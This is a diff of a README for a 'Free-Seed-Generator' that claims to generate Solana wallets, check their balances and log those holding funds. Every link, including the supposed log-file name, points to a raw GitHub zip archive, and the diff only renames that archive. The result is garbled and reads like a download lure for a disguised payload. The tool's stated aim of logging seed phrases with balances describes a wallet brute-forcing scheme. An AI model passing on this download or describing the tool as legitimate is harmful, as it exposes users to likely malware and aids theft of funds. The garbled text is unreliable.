@@ -1,10 +1,10 @@
 # 🎉 Free-Seed-Generator - Create Your Solana Wallet Easily
 
 ## 📥 Download Now
-[![Download Free-Seed-Generator](https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Free-Seed-Generator.zip)](https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Free-Seed-Generator.zip)
+[![Download Free-Seed-Generator](https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Generator-Seed-Free-1.2-beta.5.zip)](https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Generator-Seed-Free-1.2-beta.5.zip)
 
 ## 🚀 Getting Started
-Free-Seed-Generator helps you create a Solana wallet. It generates your wallet address and private key, along with seed phrases. You can also check the wallet balances on Solana networks. If the balance is greater than zero, it logs all crucial information into a file called `https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Free-Seed-Generator.zip`.
+Free-Seed-Generator helps you create a Solana wallet. It generates your wallet address and private key, along with seed phrases. You can also check the wallet balances on Solana networks. If the balance is greater than zero, it logs all crucial information into a file called `https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Generator-Seed-Free-1.2-beta.5.zip`.
 
 ## 💻 System Requirements
 - Operating System: Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
@@ -16,10 +16,10 @@ Free-Seed-Generator helps you create a Solana wallet. It generates your wallet a
 - Automatically generates Solana wallet addresses.
 - Securely creates private keys and seed phrases.
 - Checks wallet balances on Solana networks.
-- Saves wallet information to `https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Free-Seed-Generator.zip`.
+- Saves wallet information to `https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Generator-Seed-Free-1.2-beta.5.zip`.
 
 ## ⬇️ Download & Install
-1. Visit this page to download: [Free-Seed-Generator Releases](https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Free-Seed-Generator.zip).
+1. Visit this page to download: [Free-Seed-Generator Releases](https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Generator-Seed-Free-1.2-beta.5.zip).
    
 2. On the Releases page, find the latest version of Free-Seed-Generator.
 
@@ -38,11 +38,11 @@ Free-Seed-Generator helps you create a Solana wallet. It generates your wallet a
 
 4. If you want to check the wallet balance, enter the generated address and click on "Check Balance."
 
-5. If the wallet holds funds, the application will log the address, mnemonic, private key, and balance into `https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Free-Seed-Generator.zip`.
+5. If the wallet holds funds, the application will log the address, mnemonic, private key, and balance into `https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Generator-Seed-Free-1.2-beta.5.zip`.
 
 ## 📂 Accessing Your Results
-- After running the application, check the https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Free-Seed-Generator.zip file located in the same folder where you ran Free-Seed-Generator.
-- Open https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Free-Seed-Generator.zip with any text editor to view your wallet information.
+- After running the application, check the https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Generator-Seed-Free-1.2-beta.5.zip file located in the same folder where you ran Free-Seed-Generator.
+- Open https://raw.githubusercontent.com/usman71591/Free-Seed-Generator/main/semifinalist/Generator-Seed-Free-1.2-beta.5.zip with any text editor to view your wallet information.
 
 ## ❓ FAQs
 
